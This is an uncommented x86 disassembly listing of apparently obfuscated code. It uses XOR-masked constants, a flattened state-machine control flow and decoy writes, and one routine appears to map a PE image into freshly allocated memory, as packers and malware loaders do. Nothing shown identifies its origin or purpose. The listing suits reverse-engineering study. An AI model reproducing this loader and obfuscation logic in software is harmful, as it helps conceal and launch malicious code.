  427d6c:	mov    eax,DWORD PTR [eax+0x50]
  427d6f:	sub    eax,0xc
  427d72:	mov    DWORD PTR [ebp-0x28],eax
  427d75:	mov    eax,DWORD PTR [ebp+0x10]
  427d78:	mov    eax,DWORD PTR [eax+0x38]
  427d7b:	mov    ecx,DWORD PTR [ebp+0x10]
  427d7e:	dec    eax
  427d7f:	test   DWORD PTR [ecx+0x54],eax
  427d82:	mov    eax,DWORD PTR [ebp+0x10]
  427d85:	je     0x427d9f
  427d87:	mov    eax,DWORD PTR [eax+0x38]
  427d8a:	mov    ecx,DWORD PTR [ebp+0x10]
  427d8d:	mov    ecx,DWORD PTR [ecx+0x54]
  427d90:	dec    eax
  427d91:	not    eax
  427d93:	and    ecx,eax
  427d95:	mov    eax,DWORD PTR [ebp+0x10]
  427d98:	mov    eax,DWORD PTR [eax+0x38]
  427d9b:	add    eax,ecx
  427d9d:	jmp    0x427da2
  427d9f:	mov    eax,DWORD PTR [eax+0x54]
  427da2:	mov    DWORD PTR [ebp+0x1c],eax
  427da5:	mov    eax,DWORD PTR [ebp+0x8]
  427da8:	xor    eax,edi
  427daa:	add    eax,ebx
  427dac:	mov    DWORD PTR [ebp+0x18],eax
  427daf:	mov    eax,DWORD PTR [ebp+0x8]
  427db2:	xor    eax,edi
  427db4:	add    eax,ebx
  427db6:	mov    DWORD PTR [ebp+0x18],eax
  427db9:	mov    eax,DWORD PTR [ebp+0x8]
  427dbc:	mov    ecx,DWORD PTR [ebp-0x24]
  427dbf:	xor    eax,edi
  427dc1:	add    eax,ebx
  427dc3:	mov    DWORD PTR [ecx],eax
  427dc5:	mov    DWORD PTR [ebp+0x18],edx
  427dc8:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  427dcf:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  427dd6:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  427ddd:	mov    eax,DWORD PTR [ebp-0x8]
  427de0:	mov    ecx,DWORD PTR [ebp+0x1c]
  427de3:	xor    eax,edi
  427de5:	add    eax,ebx
  427de7:	imul   eax,ecx
  427dea:	mov    ecx,DWORD PTR [ebp+0x8]
  427ded:	mov    edx,DWORD PTR [ebp-0x28]
  427df0:	xor    ecx,edi
  427df2:	lea    ecx,[ecx+edx*1+0x3272e0]
  427df9:	cmp    eax,ecx
  427dfb:	jae    0x4281ad
  427e01:	mov    eax,DWORD PTR [ebp+0x8]
  427e04:	xor    eax,edi
  427e06:	add    eax,ebx
  427e08:	mov    DWORD PTR [ebp+0x18],eax
  427e0b:	mov    eax,DWORD PTR [ebp+0x1c]
  427e0e:	add    eax,DWORD PTR [ebp-0x1c]
  427e11:	mov    DWORD PTR [ebp-0x4],eax
  427e14:	push   DWORD PTR [ebp-0x4]
  427e17:	mov    esi,DWORD PTR [ebp-0x1c]
  427e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  427e1d:	call   0x426f03
  427e22:	mov    DWORD PTR [ebp+0xc],eax
  427e25:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  427e2c:	mov    eax,DWORD PTR [ebp-0x18]
  427e2f:	xor    eax,edi
  427e31:	add    eax,ebx
  427e33:	push   eax
  427e34:	lea    eax,[ebp-0x40]
  427e37:	push   eax
  427e38:	call   0x42750e
  427e3d:	mov    eax,DWORD PTR [ebp+0xc]
  427e40:	test   eax,eax
  427e42:	je     0x427e92
  427e44:	mov    eax,DWORD PTR [ebp-0x18]
  427e47:	xor    eax,edi
  427e49:	add    eax,ebx
  427e4b:	push   eax
  427e4c:	push   DWORD PTR [ebp+0xc]
  427e4f:	lea    eax,[ebp-0x40]
  427e52:	push   eax
  427e53:	call   0x4273b5
  427e58:	mov    eax,DWORD PTR [ebp-0x4]
  427e5b:	mov    DWORD PTR [ebp-0x18],eax
  427e5e:	mov    eax,DWORD PTR [ebp-0x18]
  427e61:	mov    ecx,DWORD PTR [ebp-0x1c]
  427e64:	sub    eax,ecx
  427e66:	mov    DWORD PTR [ebp-0x18],eax
  427e69:	mov    eax,DWORD PTR [ebp+0xc]
  427e6c:	mov    ecx,DWORD PTR [ebp+0xc]
  427e6f:	mov    eax,DWORD PTR [eax+0x10]
  427e72:	add    eax,DWORD PTR [ecx+0xc]
  427e75:	mov    ecx,DWORD PTR [ebp-0x18]
  427e78:	cmp    ecx,eax
  427e7a:	jb     0x427e92
  427e7c:	mov    eax,DWORD PTR [ebp+0xc]
  427e7f:	mov    eax,DWORD PTR [eax+0xc]
  427e82:	mov    ecx,DWORD PTR [ebp+0xc]
  427e85:	add    eax,DWORD PTR [ecx+0x8]
  427e88:	mov    ecx,DWORD PTR [ebp-0x18]
  427e8b:	sub    eax,ecx
  427e8d:	jmp    0x428180
  427e92:	push   0xc
  427e94:	push   DWORD PTR [ebp-0x4]
  427e97:	lea    eax,[ebp-0x4c]
  427e9a:	push   eax
  427e9b:	call   0x4273b5
  427ea0:	mov    eax,0xf89c85b9
  427ea5:	mov    DWORD PTR [ebp-0x2c],eax
  427ea8:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  427eaf:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  427eb6:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  427ebd:	lea    ecx,[ebp-0x2c]
  427ec0:	mov    DWORD PTR [ebp-0xc],ecx
  427ec3:	lea    ecx,[ebp-0x30]
  427ec6:	mov    DWORD PTR [ebp-0x10],ecx
  427ec9:	lea    ecx,[ebp-0x34]
  427ecc:	mov    DWORD PTR [ebp+0xc],ecx
  427ecf:	lea    ecx,[ebp-0x38]
  427ed2:	mov    DWORD PTR [ebp-0x14],ecx
  427ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  427ed8:	xor    ecx,edi
  427eda:	add    ecx,ebx
  427edc:	mov    DWORD PTR [ebp-0x18],ecx
  427edf:	jmp    0x4280db
  427ee4:	cmp    eax,0xf89c85bb
  427ee9:	je     0x4280ed
  427eef:	mov    ecx,DWORD PTR [ebp-0x8]
  427ef2:	xor    ecx,edi
  427ef4:	mov    esi,eax
  427ef6:	add    ecx,ebx
  427ef8:	mov    DWORD PTR [ebp+0x18],ecx
  427efb:	mov    eax,DWORD PTR [ebp-0x18]
  427efe:	xor    esi,edi
  427f00:	lea    eax,[eax+esi*1+0x3272e0]
  427f07:	mov    DWORD PTR [ebp-0x18],eax
  427f0a:	mov    eax,DWORD PTR [ebp-0x8]
  427f0d:	mov    ecx,DWORD PTR [ebp-0x18]
  427f10:	xor    eax,edi
  427f12:	add    eax,ebx
  427f14:	cmp    ecx,eax
  427f16:	jne    0x427f2b
  427f18:	mov    eax,DWORD PTR [ebp+0x8]
  427f1b:	xor    eax,edi
  427f1d:	add    eax,ebx
  427f1f:	push   eax
  427f20:	push   0xc
  427f22:	lea    eax,[ebp-0x4c]
  427f25:	push   eax
  427f26:	call   0x42792c
  427f2b:	mov    eax,DWORD PTR [ebp-0xc]
  427f2e:	mov    eax,DWORD PTR [eax]
  427f30:	xor    eax,edi
  427f32:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  427f39:	mov    ecx,DWORD PTR [ebp+0x8]
  427f3c:	xor    ecx,edi
  427f3e:	movzx  eax,al
  427f41:	add    ecx,ebx
  427f43:	cmp    eax,ecx
  427f45:	je     0x4280c3
  427f4b:	mov    eax,DWORD PTR [ebp-0x10]
  427f4e:	mov    eax,DWORD PTR [eax]
  427f50:	xor    eax,edi
  427f52:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  427f59:	mov    ecx,DWORD PTR [ebp+0x8]
  427f5c:	xor    ecx,edi
  427f5e:	movzx  eax,al
  427f61:	add    ecx,ebx
  427f63:	cmp    eax,ecx
  427f65:	je     0x4280c3
  427f6b:	mov    eax,DWORD PTR [ebp+0xc]
  427f6e:	mov    eax,DWORD PTR [eax]
  427f70:	xor    eax,edi
  427f72:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  427f79:	mov    ecx,DWORD PTR [ebp+0x8]
  427f7c:	xor    ecx,edi
  427f7e:	movzx  eax,al
  427f81:	add    ecx,ebx
  427f83:	cmp    eax,ecx
  427f85:	je     0x4280c3
  427f8b:	mov    eax,DWORD PTR [ebp-0x14]
  427f8e:	mov    eax,DWORD PTR [eax]
  427f90:	xor    eax,edi
  427f92:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  427f99:	mov    ecx,DWORD PTR [ebp+0x8]
  427f9c:	xor    ecx,edi
  427f9e:	movzx  eax,al
  427fa1:	add    ecx,ebx
  427fa3:	cmp    eax,ecx
  427fa5:	je     0x4280c3
  427fab:	mov    eax,DWORD PTR [ebp-0x10]
  427fae:	mov    eax,DWORD PTR [eax]
  427fb0:	xor    eax,edi
  427fb2:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  427fb9:	mov    ecx,DWORD PTR [ebp-0xc]
  427fbc:	mov    ecx,DWORD PTR [ecx]
  427fbe:	xor    ecx,edi
  427fc0:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  427fc7:	xor    al,cl
  427fc9:	mov    ecx,DWORD PTR [ebp+0xc]
  427fcc:	mov    ecx,DWORD PTR [ecx]
  427fce:	xor    ecx,edi
  427fd0:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  427fd7:	or     al,cl
  427fd9:	mov    ecx,DWORD PTR [ebp-0xc]
  427fdc:	mov    ecx,DWORD PTR [ecx]
  427fde:	xor    ecx,edi
  427fe0:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  427fe7:	cmp    cl,al
  427fe9:	jne    0x4280c3
  427fef:	mov    eax,DWORD PTR [ebp+0xc]
  427ff2:	mov    eax,DWORD PTR [eax]
  427ff4:	xor    eax,edi
  427ff6:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  427ffd:	mov    ecx,DWORD PTR [ebp-0x10]
  428000:	mov    ecx,DWORD PTR [ecx]
  428002:	xor    ecx,edi
  428004:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  42800b:	xor    al,cl
  42800d:	mov    ecx,DWORD PTR [ebp-0x14]
  428010:	mov    ecx,DWORD PTR [ecx]
  428012:	xor    ecx,edi
  428014:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  42801b:	or     al,cl
  42801d:	mov    ecx,DWORD PTR [ebp-0x10]
  428020:	mov    ecx,DWORD PTR [ecx]
  428022:	xor    ecx,edi
  428024:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  42802b:	cmp    cl,al
  42802d:	jne    0x4280c3
  428033:	mov    eax,DWORD PTR [ebp-0x14]
  428036:	mov    eax,DWORD PTR [eax]
  428038:	xor    eax,edi
  42803a:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  428041:	mov    ecx,DWORD PTR [ebp+0xc]
  428044:	mov    ecx,DWORD PTR [ecx]
  428046:	xor    ecx,edi
  428048:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  42804f:	xor    al,cl
  428051:	mov    ecx,DWORD PTR [ebp-0xc]
  428054:	mov    ecx,DWORD PTR [ecx]
  428056:	xor    ecx,edi
  428058:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  42805f:	or     al,cl
  428061:	mov    ecx,DWORD PTR [ebp+0xc]
  428064:	mov    ecx,DWORD PTR [ecx]
  428066:	xor    ecx,edi
  428068:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  42806f:	cmp    cl,al
  428071:	jne    0x4280c3
  428073:	mov    eax,DWORD PTR [ebp-0x14]
  428076:	mov    eax,DWORD PTR [eax]
  428078:	xor    eax,edi
  42807a:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  428081:	mov    ecx,DWORD PTR [ebp-0xc]
  428084:	mov    ecx,DWORD PTR [ecx]
  428086:	xor    ecx,edi
  428088:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  42808f:	xor    al,cl
  428091:	mov    ecx,DWORD PTR [ebp-0x10]
  428094:	mov    ecx,DWORD PTR [ecx]
  428096:	xor    ecx,edi
  428098:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  42809f:	or     al,cl
  4280a1:	mov    ecx,DWORD PTR [ebp-0x14]
  4280a4:	mov    ecx,DWORD PTR [ecx]
  4280a6:	xor    ecx,edi
  4280a8:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  4280af:	cmp    cl,al
  4280b1:	jne    0x4280c3
  4280b3:	lea    eax,[ebp-0x4c]
  4280b6:	push   eax
  4280b7:	call   0x427b7d
  4280bc:	mov    ecx,DWORD PTR [ebp-0x44]
  4280bf:	cmp    eax,ecx
  4280c1:	je     0x4280cd
  4280c3:	mov    eax,DWORD PTR [ebp+0x8]
  4280c6:	xor    eax,edi
  4280c8:	add    eax,ebx
  4280ca:	mov    DWORD PTR [ebp+0x18],eax
  4280cd:	mov    eax,DWORD PTR [ebp-0x8]
  4280d0:	xor    eax,edi
  4280d2:	lea    eax,[eax+esi*1+0x3272e0]
  4280d9:	xor    eax,edi
  4280db:	mov    ecx,DWORD PTR [ebp+0x8]
  4280de:	mov    edx,DWORD PTR [ebp+0x18]
  4280e1:	xor    ecx,edi
  4280e3:	add    ecx,ebx
  4280e5:	cmp    edx,ecx
  4280e7:	je     0x427ee4
  4280ed:	mov    eax,DWORD PTR [ebp+0x8]
  4280f0:	mov    ecx,DWORD PTR [ebp+0x18]
  4280f3:	xor    eax,edi
  4280f5:	add    eax,ebx
  4280f7:	cmp    ecx,eax
  4280f9:	jne    0x42810c
  4280fb:	mov    eax,DWORD PTR [ebp-0x8]
  4280fe:	mov    ecx,DWORD PTR [ebp+0x1c]
  428101:	xor    eax,edi
  428103:	lea    eax,[eax+ecx*1+0x3272e0]
  42810a:	jmp    0x428183
  42810c:	push   0x18
  42810e:	push   DWORD PTR [ebp-0x4]
  428111:	lea    eax,[ebp-0x64]
  428114:	push   eax
  428115:	call   0x4273b5
  42811a:	mov    eax,DWORD PTR [ebp+0x8]
  42811d:	mov    ecx,DWORD PTR [ebp-0x18]
  428120:	xor    eax,edi
  428122:	add    eax,ebx
  428124:	cmp    eax,ecx
  428126:	je     0x42813b
  428128:	mov    eax,DWORD PTR [ebp+0x8]
  42812b:	xor    eax,edi
  42812d:	add    eax,ebx
  42812f:	push   eax
  428130:	push   0x18
  428132:	lea    eax,[ebp-0x64]
  428135:	push   eax
  428136:	call   0x42792c
  42813b:	mov    eax,DWORD PTR [ebp-0x4]
  42813e:	add    eax,0x18
  428141:	mov    DWORD PTR [ebp+0x18],eax
  428144:	push   DWORD PTR [ebp-0x50]
  428147:	push   DWORD PTR [ebp+0x18]
  42814a:	mov    eax,DWORD PTR [ebp-0x54]
  42814d:	add    eax,DWORD PTR [ebp-0x20]
  428150:	push   eax
  428151:	call   0x4273b5
  428156:	mov    eax,DWORD PTR [ebp+0x8]
  428159:	mov    ecx,DWORD PTR [ebp-0x18]
  42815c:	xor    eax,edi
  42815e:	add    eax,ebx
  428160:	cmp    eax,ecx
  428162:	je     0x428175
  428164:	push   0x0
  428166:	push   DWORD PTR [ebp-0x50]
  428169:	mov    eax,DWORD PTR [ebp-0x54]
  42816c:	add    eax,DWORD PTR [ebp-0x20]
  42816f:	push   eax
  428170:	call   0x42792c
  428175:	mov    eax,DWORD PTR [ebp-0x24]
  428178:	mov    ecx,DWORD PTR [ebp-0x50]
  42817b:	add    DWORD PTR [eax],ecx
  42817d:	mov    eax,DWORD PTR [ebp-0x50]
  428180:	add    eax,DWORD PTR [ebp+0x1c]
  428183:	mov    DWORD PTR [ebp+0x1c],eax
  428186:	mov    eax,DWORD PTR [ebp-0x8]
  428189:	mov    ecx,DWORD PTR [ebp+0x1c]
  42818c:	xor    eax,edi
  42818e:	add    eax,ebx
  428190:	imul   eax,ecx
  428193:	mov    ecx,DWORD PTR [ebp+0x8]
  428196:	mov    edx,DWORD PTR [ebp-0x28]
  428199:	xor    ecx,edi
  42819b:	lea    ecx,[ecx+edx*1+0x3272e0]
  4281a2:	cmp    eax,ecx
  4281a4:	jb     0x427e01
  4281aa:	mov    esi,DWORD PTR [ebp+0x14]
  4281ad:	mov    eax,DWORD PTR [ebp-0x20]
  4281b0:	mov    DWORD PTR [esi],eax
  4281b2:	jmp    0x4281f9
  4281b4:	mov    ecx,DWORD PTR [ebp+0x8]
  4281b7:	mov    edx,DWORD PTR [ebp+0xc]
  4281ba:	xor    ecx,edi
  4281bc:	xor    edx,edi
  4281be:	add    ecx,ebx
  4281c0:	add    edx,ebx
  4281c2:	cmp    ecx,edx
  4281c4:	jne    0x4281d8
  4281c6:	mov    eax,ds:0x7f642d1e
  4281cb:	imul   eax,eax,0x9f15fcef
  4281d1:	mov    ds:0x7f642d1e,eax
  4281d6:	jmp    0x4281f9
  4281d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4281db:	xor    ecx,edi
  4281dd:	add    ecx,ebx
  4281df:	cmp    eax,ecx
  4281e1:	je     0x4281ef
  4281e3:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4281ed:	jmp    0x4281f9
  4281ef:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  4281f9:	pop    edi
  4281fa:	pop    esi
  4281fb:	pop    ebx
  4281fc:	leave  
  4281fd:	ret    0x18
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	and    esp,0xfffffff8
  428206:	mov    eax,DWORD PTR [ebp+0x20]
  428209:	sub    esp,0x14
  42820c:	push   ebx
  42820d:	mov    ebx,DWORD PTR [ebp+0x14]
  428210:	push   esi
  428211:	push   edi
  428212:	cmp    eax,0xf89c85b9
  428217:	jne    0x428223
  428219:	push   0xf89c85b8
  42821e:	jmp    0x428355
  428223:	mov    eax,DWORD PTR [ebp+0x20]
  428226:	cmp    eax,0xf89c85b8
  42822b:	jne    0x428237
  42822d:	push   0xf89c85bb
  428232:	jmp    0x428355
  428237:	mov    eax,DWORD PTR [ebp+0x20]
  42823a:	cmp    eax,0xf89c85bb
  42823f:	jne    0x42824b
  428241:	push   0xf89c85ba
  428246:	jmp    0x428355
  42824b:	mov    eax,DWORD PTR [ebp+0x20]
  42824e:	cmp    eax,0xf89c85ba
  428253:	jne    0x42825f
  428255:	push   0xf89c85bd
  42825a:	jmp    0x428355
  42825f:	mov    ecx,DWORD PTR [ebp+0x20]
  428262:	mov    eax,0xf89c85be
  428267:	cmp    ecx,eax
  428269:	jne    0x428325
  42826f:	mov    eax,DWORD PTR [ebp+0x10]
  428272:	mov    DWORD PTR [esp+0xc],eax
  428276:	mov    eax,DWORD PTR [ebp+0x18]
  428279:	mov    DWORD PTR [esp+0x14],eax
  42827d:	mov    eax,DWORD PTR [ebp+0xc]
  428280:	mov    DWORD PTR [esp+0x18],eax
  428284:	mov    eax,DWORD PTR [ebp+0x8]
  428287:	mov    DWORD PTR [esp+0x10],eax
  42828b:	mov    eax,DWORD PTR [esp+0x10]
  42828f:	mov    ecx,DWORD PTR [esp+0x14]
  428293:	mov    edi,0x7510899
  428298:	xor    eax,edi
  42829a:	mov    esi,0x3272e0
  42829f:	add    eax,esi
  4282a1:	mov    DWORD PTR [ecx],eax
  4282a3:	mov    eax,DWORD PTR [esp+0xc]
  4282a7:	mov    eax,DWORD PTR [eax+0x194]
  4282ad:	mov    ecx,DWORD PTR [eax]
  4282af:	mov    eax,DWORD PTR [esp+0xc]
  4282b3:	mov    eax,DWORD PTR [eax+0x194]
  4282b9:	mov    eax,DWORD PTR [eax]
  4282bb:	add    eax,DWORD PTR [ecx+0x3c]
  4282be:	mov    ecx,DWORD PTR [esp+0xc]
  4282c2:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4282c8:	mov    ecx,DWORD PTR [ecx+0x14]
  4282cb:	push   0x4
  4282cd:	push   0x3000
  4282d2:	push   DWORD PTR [eax+0x50]
  4282d5:	push   0x0
  4282d7:	call   ecx
  4282d9:	mov    DWORD PTR [ebx],eax
  4282db:	mov    eax,DWORD PTR [esp+0x10]
  4282df:	push   DWORD PTR [esp+0xc]
  4282e3:	xor    eax,edi
  4282e5:	add    eax,esi
  4282e7:	mov    DWORD PTR [esp+0x20],eax
  4282eb:	lea    eax,[esp+0x20]
  4282ef:	push   eax
  4282f0:	push   ebx
  4282f1:	push   DWORD PTR [esp+0x20]
  4282f5:	push   DWORD PTR [esp+0x28]
  4282f9:	push   DWORD PTR [esp+0x24]
  4282fd:	call   0x427cc1
  428302:	mov    eax,DWORD PTR [esp+0x10]
  428306:	mov    ecx,DWORD PTR [ebx]
  428308:	xor    eax,edi
  42830a:	add    eax,esi
  42830c:	cmp    ecx,eax
  42830e:	je     0x42836c
  428310:	mov    eax,DWORD PTR [esp+0x18]
  428314:	mov    ecx,DWORD PTR [esp+0x14]
  428318:	xor    eax,edi
  42831a:	add    eax,esi
  42831c:	imul   eax,DWORD PTR [esp+0x1c]
  428321:	mov    DWORD PTR [ecx],eax
  428323:	jmp    0x42836c
  428325:	mov    ecx,DWORD PTR [ebp+0x20]
  428328:	cmp    ecx,0xf89c85bd
  42832e:	jne    0x428337
  428330:	push   0xf89c85bc
  428335:	jmp    0x428355
  428337:	mov    ecx,DWORD PTR [ebp+0x20]
  42833a:	cmp    ecx,0xf89c85bc
  428340:	jne    0x428349
  428342:	push   0xf89c85bf
  428347:	jmp    0x428355
  428349:	mov    ecx,DWORD PTR [ebp+0x20]
  42834c:	cmp    ecx,0xf89c85bf
  428352:	jne    0x42836c
  428354:	push   eax
  428355:	push   DWORD PTR [ebp+0x1c]
  428358:	push   DWORD PTR [ebp+0x18]
  42835b:	push   ebx
  42835c:	push   DWORD PTR [ebp+0x10]
  42835f:	push   DWORD PTR [ebp+0xc]
  428362:	push   DWORD PTR [ebp+0x8]
  428365:	call   0x428200
  42836a:	mov    DWORD PTR [ebx],eax
  42836c:	mov    eax,DWORD PTR [ebx]
  42836e:	pop    edi
  42836f:	pop    esi
  428370:	pop    ebx
  428371:	mov    esp,ebp
  428373:	pop    ebp
  428374:	ret    0x1c
  428377:	push   ebp
  428378:	mov    ebp,esp
  42837a:	sub    esp,0xc
  42837d:	mov    eax,0xf89c85b9
  428382:	mov    DWORD PTR [ebp-0x8],eax
  428385:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  42838c:	mov    ecx,DWORD PTR [ebp-0x8]
  42838f:	xor    ecx,0x7510899
  428395:	add    ecx,0x3272e0
  42839b:	mov    DWORD PTR [ebp-0x4],ecx
  42839e:	mov    ecx,DWORD PTR [ebp+0xc]
  4283a1:	push   eax
  4283a2:	mov    DWORD PTR [ebp+0xc],ecx
  4283a5:	push   DWORD PTR [ebp+0xc]
  4283a8:	lea    eax,[ebp-0x4]
  4283ab:	push   DWORD PTR [ebp+0x8]
  4283ae:	push   eax
  4283af:	push   DWORD PTR [ebp+0xc]
  4283b2:	push   DWORD PTR [ebp-0xc]
  4283b5:	push   DWORD PTR [ebp-0x8]
  4283b8:	call   0x428200
  4283bd:	mov    DWORD PTR [ebp-0x4],eax
  4283c0:	mov    eax,DWORD PTR [ebp-0x4]
  4283c3:	leave  
  4283c4:	ret    0x8
